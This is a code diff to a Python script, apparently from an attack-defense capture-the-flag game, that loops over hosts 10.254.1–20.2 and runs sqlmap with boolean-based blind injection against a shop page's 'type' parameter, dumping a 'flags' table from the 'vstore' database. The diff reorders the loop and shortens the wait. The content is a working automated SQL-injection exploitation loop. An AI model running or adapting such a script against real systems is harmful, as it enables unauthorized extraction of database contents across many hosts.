@@ -4,12 +4,12 @@ from time import sleep
     
 while True:
     flag=[]
-    for i in range(20,0,-1):
+    for i in range(1,21):
         if i==5:
             continue
         try:
             p = subprocess.Popen(f"""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.{i}.2:4001/index.php?page=shop&type=VGA" --technique=B -D vstore -T flags --dump --batch > temp_web{i}.txt""", shell=True)
-            sleep(20)            
+            sleep(10)            
             with open(f"temp_web{i}.txt","r") as f:
                 data=[]
                 for line in f:
